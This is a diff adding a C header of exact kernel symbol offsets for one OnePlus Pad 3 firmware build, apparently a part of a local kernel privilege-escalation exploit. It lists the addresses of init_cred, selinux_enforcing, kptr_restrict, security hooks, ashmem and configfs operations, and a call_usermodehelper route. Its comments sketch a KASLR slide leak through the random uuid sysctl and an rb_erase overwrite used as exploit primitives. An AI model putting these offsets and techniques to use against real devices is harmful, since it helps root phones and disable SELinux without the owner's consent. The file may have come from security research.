@@ -1,0 +1,120 @@
+#ifndef ONEPLUS_PAD3_EX01_SYMBOL_OFFSETS_H
+#define ONEPLUS_PAD3_EX01_SYMBOL_OFFSETS_H
+
+/*
+ * Exact symbol offsets for OPD2415_16.0.9.400(EX01).
+ *
+ * Source of truth:
+ *   boot.img sha256  0e584a801f2214758758221feb47dd3e06736d0a348709780bd58aea78fc420f
+ *   kernel sha256    d4d2cbf9cf97e522b2e4a4ba8cee6b1ef205eaa5b04d632a25b0e21c8c817bf5
+ *   kallsyms sha256  2928ed9b5a9b12d00fe2cfe46c6b3a9ed3431111d3b61a70c915316c8a8c1c3e
+ *
+ * Every value below was resolved from this Image's embedded kallsyms and is
+ * relative to _text (0xffffffc080000000).  The one derived value is
+ * ASHMEM_MISC_FOPS_OFF: BTF puts miscdevice.fops at +0x10, so it is
+ * ashmem_misc + 0x10.  This build uses the C ashmem driver.
+ */
+
+#define INIT_TASK_OFF             0x0211e280ULL
+#define INIT_CRED_OFF             0x02130748ULL
+#define INIT_UTS_NS_OFF           0x022a3448ULL
+#define EMPTY_ZERO_PAGE_OFF       0x0230f000ULL
+#define ROOT_TASK_GROUP_OFF       0x02317580ULL
+#define SELINUX_ENFORCING_OFF     0x02358ee0ULL
+#define KPTR_RESTRICT_OFF         0x0211bcf8ULL
+#define SELINUX_BLOB_SIZES_OFF    0x0167b5d0ULL
+#define SECURITY_HOOK_HEADS_OFF   0x0167ae98ULL
+#define KMALLOC_CACHES_OFF        0x0167a9d8ULL
+#define ANON_PIPE_BUF_OPS_OFF     0x0116eb08ULL
+
+#define CONFIGFS_READ_ITER_OFF      0x004907f0ULL
+#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00490d1cULL
+#define COPY_SPLICE_READ_OFF         0x004144e4ULL
+#define NOOP_LLSEEK_OFF              0x003c7244ULL
+
+#define ASHMEM_MISC_FOPS_OFF       0x0227c528ULL
+#define ASHMEM_FOPS_OFF            0x012ef880ULL
+#define ASHMEM_IOCTL_OFF           0x00c8bfb0ULL
+#define ASHMEM_COMPAT_IOCTL_OFF    0x00c8c66cULL
+#define ASHMEM_MMAP_OFF            0x00c8c6c0ULL
+#define ASHMEM_OPEN_OFF            0x00c8c8e0ULL
+#define ASHMEM_RELEASE_OFF         0x00c8c968ULL
+#define ASHMEM_SHOW_FDINFO_OFF     0x00c8c9f4ULL
+
+/* This 6.6 build has no security_hook_active_capable_* kallsyms entry. */
+#define CAP_CAPABLE_ACTIVE_OFF     0ULL
+
+/* Kernel slide sources.
+ *
+ * The Pad 3 uses the random `uuid` ctl_table entry as a transient read
+ * oracle.  These values are all from this exact Image:
+ *
+ *   random_table + 0x140 + offsetof(struct ctl_table, data) = 0x02239468
+ *   nfulnl_logger.name                                  -> 0x0160f939
+ *   nfulnl_logger.type plus its padding (one qword)        0x02112268
+ *   nfulnl_logger.logfn                                 -> 0x00e5e878
+ *
+ * SLIDE_NFULNL_LOGGER_NAME_OFF and
+ * SLIDE_NFULNL_LOGGER_LOGFN_OFF are RVAs of the pointer values stored in the
+ * object, not the addresses of the fields themselves.  rb_erase's exact
+ * one-child path overwrites the type/padding qword with the uuid data-slot
+ * alias; the first configfs primitive restores it to 1 and verifies logfn.
+ */
+#define SLIDE_NFULNL_LOGGER_OFF       0x02112260ULL
+#define SLIDE_LOGGERS_0_1_OFF         0x021121b0ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02239428ULL
+#define SLIDE_SYSCTL_BOOTID_OFF       0x02379ed8ULL
+#define SLIDE_RANDOM_UUID_DATA_OFF    0x02239468ULL
+#define SLIDE_NFULNL_LOGGER_NAME_OFF  0x0160f939ULL
+#define SLIDE_NFULNL_LOGGER_TYPE_QWORD_OFF 0x02112268ULL
+#define SLIDE_NFULNL_LOGGER_TYPE_QWORD_ORIGINAL 0x0000000000000001ULL
+#define SLIDE_NFULNL_LOGGER_LOGFN_OFF 0x00e5e878ULL
+
+/* call_usermodehelper workqueue route. */
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d0ef0ULL
+#define SYSTEM_UNBOUND_WQ_OFF             0x0210ae60ULL
+
+#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
+#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
+#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
+#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
+#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
+#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
+#define KPTR_RESTRICT       (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
+#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
+#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
+#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
+#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
+#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
+#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
+#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
+#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
+#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
+#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
+#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
+#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
+#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
+#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
+#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
+#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
+#define CALL_USERMODEHELPER_EXEC_WORK \
+  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
+#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
+#define SLIDE_NFULNL_LOGGER_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
+#define SLIDE_LOGGERS_0_1_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
+#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
+#define SLIDE_INIT_TASK_IMAGE \
+  (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
+#define SLIDE_ROOT_TASK_GROUP_IMAGE \
+  (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
+#define SLIDE_SYSCTL_BOOTID_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
+#define SLIDE_RANDOM_UUID_DATA_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_UUID_DATA_OFF)
+#define SLIDE_NFULNL_LOGGER_TYPE_QWORD_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_TYPE_QWORD_OFF)
+
+#endif
